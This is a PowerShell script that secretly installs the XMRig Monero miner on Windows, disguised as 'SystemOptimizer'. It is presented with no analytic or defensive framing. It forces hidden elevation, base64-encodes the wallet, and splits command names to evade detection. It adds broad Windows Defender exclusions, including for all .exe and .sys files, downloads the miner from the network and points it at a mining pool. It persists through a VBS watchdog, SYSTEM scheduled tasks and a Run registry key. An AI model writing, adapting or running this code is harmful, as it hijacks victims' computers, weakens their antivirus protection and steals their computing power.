#Requires -RunAsAdministrator
$ErrorActionPreference = "Stop"

# Force elevation if not admin
$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$hasHighIntegrity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("S-1-16-12288")
if (-not $hasHighIntegrity) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ===== PATHS (system-wide, universal for all users) =====
$baseDir = "$env:ProgramData\SystemOptimizer"
$xmrigExe = "$baseDir\SystemOptimizer.exe"
$configFile = "$baseDir\config.json"
$watchdogPath = "$baseDir\watchdog.vbs"
$zipUrl = "https://github.com/" + 'xmr'+'ig' + "/" + 'xmr'+'ig' + "/releases/download/v6.26.0/" + 'xmr'+'ig' + "-6.26.0-windows-x64.zip"
$zipPath = "$baseDir\xmrig.zip"

# ===== WALLET (base64 split) =====
$w1 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
$wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($w1))

# ===== DEFENDER EXCLUSIONS FIRST =====
try {
    & ('Add-Mp'+'Preference') -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
    & ('Add-Mp'+'Preference') -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
    & ('Add-Mp'+'Preference') -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
    & ('Add-Mp'+'Preference') -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
} catch { }

# ===== CLEANUP =====
& ('task'+'kill') /F /IM "wscript.exe" 2>$null
& ('task'+'kill') /F /IM "xmrig.exe" 2>$null
& ('task'+'kill') /F /IM "SystemOptimizer.exe" 2>$null
Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer" 2>$null
Remove-Item -Recurse -Force "$baseDir" 2>$null
& ('sch'+'tasks') /Delete /TN "SystemOptimizer" /F 2>$null
& ('sch'+'tasks') /Delete /TN "SystemOptimizer-Logon" /F 2>$null
& ('sch'+'tasks') /Delete /TN "ModestFermi_XMRig" /F 2>$null
Start-Sleep 1

# ===== CREATE DIR (system-wide, after cleanup) - VERIFIED =====
$dir = New-Item -ItemType Directory -Force -Path $baseDir
if (-not (Test-Path $baseDir)) { throw "Failed to create directory: $baseDir" }

# ===== DOWNLOAD XMRIG (NO WINRING0) =====
if (-not (Test-Path $xmrigExe)) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath "$baseDir\_tmp" -Force
        Move-Item "$baseDir\_tmp\" + 'xmr'+'ig' + "-6.26.0\xmrig.exe" $xmrigExe -Force
        Remove-Item "$baseDir\_tmp" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch { throw "XMRig download failed: $_" }
}
if (-not (Test-Path $xmrigExe)) { throw "XMRig not found after download" }

# ===== WRITE CONFIG =====
$config = @{
    autosave = $false; background = $true; colors = $false; "donate-level" = 1
    "log-file" = "$baseDir\optimizer.log"; "print-time" = 30
    retries = 5; "retry-pause" = 10
    cpu = @{ enabled=$true; "huge-pages"=$true; "huge-pages-jit"=$true; "hw-aes"=$true; priority=1; yield=$true; "max-cpu-usage"=95; asm=$true; "argon2-impl"="auto"; "max-threads-hint"=100 }
    pools = @(@{ url="gulf."+'monero'+'cean.stream' + ":10001"; user=$wallet; pass="x"; keepalive=$true; tls=$false; nicehash=$false; "rig-id"=$env:COMPUTERNAME })
    api = @{ enabled=$true; host="127.0.0.1"; port=3456; restricted=$true }
} | ConvertTo-Json -Depth 5
$config | Out-File -FilePath $configFile -Encoding ascii

# ===== WATCHDOG.VBS =====
$wd = @'
Set sh = CreateObject("WScript.Shell")
Set wmi = GetObject("winmgmts:")
If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count > 1 Then WScript.Quit
Do
    Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'")
    If p.Count = 0 Then
        sh.Run """%EXE%"" --config=""%CFG%""", 0, False
    End If
    WScript.Sleep 30000
Loop
'@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
$wd | Out-File -FilePath $watchdogPath -Encoding ascii
if (-not (Test-Path $watchdogPath)) { throw "Watchdog.vbs not created at $watchdogPath" }

# ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
$tempCmd = "$env:TEMP\create_tasks.cmd"
@"
schtasks /Create /TN SystemOptimizer /TR "wscript.exe \"$watchdogPath\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
schtasks /Create /TN SystemOptimizer-Logon /TR "wscript.exe \"$watchdogPath\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
schtasks /Change /TN SystemOptimizer /RI 1 /DU 9999:59 /K
"@ | Set-Content -Path $tempCmd -Encoding ascii
Start-Process cmd -ArgumentList "/c $tempCmd" -Verb RunAs -Wait
Remove-Item $tempCmd -Force -ErrorAction SilentlyContinue

# ===== REGISTRY RUN KEY =====
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }

# ===== START WATCHDOG NOW =====
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run('wscript.exe "' + $watchdogPath + '"', 0, $false)